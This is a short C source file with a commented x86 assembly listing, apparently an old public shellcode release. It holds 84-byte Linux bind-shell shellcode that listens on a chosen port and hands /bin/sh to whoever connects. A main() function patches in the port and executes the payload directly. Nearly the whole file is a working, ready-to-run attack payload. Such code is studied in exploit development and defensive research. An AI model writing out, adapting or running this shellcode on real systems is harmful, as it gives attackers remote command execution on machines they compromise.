/*
	Full remote shell tiny shellcode - 84 bytes (bindshell)
	by sd@cdi.cz, if you can make it _shorter_ than 84 bytes, please
	send me changes.

# socket(AF_INET, SOCKET_STREAM, IPPROTO_TCP)
	push	$0x66		# socketcall()
	pop	%eax
	xor	%ebx, %ebx
	push	%ebx		# IPPROTO_TCP == 0
	inc	%ebx		# socket() subcall == 1 (inc %ebx)
	push	%ebx		# SOCKET_STREAM == 1
	push	$0x2		# AF_IENT == 2
	mov	%esp, %ecx	# arg struct
	int	$0x80

# bind(fd)
	inc	%ebx		# bind() subcall == 2
	xorl	%ecx, %ecx
	push	%ecx		# INADDR_ANY
	mov	$0x0a, %ch	# PORT / 256
	bswap	%ecx
	or	%ebx, %ecx
	push	%ecx		# port & AF_INET
	mov	%esp, %esi	# sockaddr struct int esi
	push	$0x10		# 16 bytes long
	push	%esi		# save argstruct
	push	%eax		# save fd
	push	$0x66
	pop	%eax
	mov	%esp, %ecx
	int	$0x80

# listen(fd, something)
	mov	$0x66, %al
	inc	%ebx
	inc	%ebx		# listen() == 4
	int	$0x80

	mov	%esp, 8(%esp)

# accept()
	mov	$0x66, %al
	inc	%ebx		# accept() == 5
	int	$0x80
	xchg	%eax, %ebx	# %ebx == fd, %eax == 5
	xchg	%eax, %ecx	# %ecx == 5, %eax = blah

# dup2(fd, 0-1-2)
1:
	push   $0x3f
	pop    %eax
	int    $0x80
	dec    %ecx		# next fd
	jns    1b

	push	%eax
	.byte	0x68
	.ascii	"n/sh"
	.byte	0x68
	.ascii	"//bi"
	mov	%esp, %ebx
	push	%eax
	push	%ebx
	mov	%esp, %ecx
	mov	$0xb, %al
	int	$0x80


*/

#include <stdio.h>
#include <stdlib.h>

/*
	sc[19] == port / 256
	(only multiplers of 256 can be used)
*/

unsigned char sc[84] =
	"\x6a\x66\x58\x31\xdb\x53\x43\x53"
	"\x6a\x02\x89\xe1\xcd\x80\x43\x31"
	"\xc9\x51\xb5\x0a\x0f\xc9\x09\xd9" /* 0x0a * 256 = port 2560 */
	"\x51\x89\xe6\x6a\x10\x56\x50\x6a"
	"\x66\x58\x89\xe1\xcd\x80\xb0\x66"
	"\x43\x43\xcd\x80\x89\x64\x24\x08"
	"\xb0\x66\x43\xcd\x80\x93\x91\x6a"
	"\x3f\x58\xcd\x80\x49\x79\xf8\x50"
	"\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
	"\x62\x69\x89\xe3\x50\x53\x89\xe1"
	"\xb0\x0b\xcd\x80";

int	main()
{
	int		port;
	void		(*execme)() = (void *) sc;
	printf("Enter port to bind to:");
	while (scanf("%u", &port) != 1) fflush(stdin);
	port = (port + 255) / 256;
	printf("Listening on %d\n", port * 256);
	if (port > 255) {
		printf("ERROR: Port too high.\n");
	};
	sc[19] = port;
	printf("Executing bindshell\n"); fflush(stdout);
	execme();
	return 0;
}
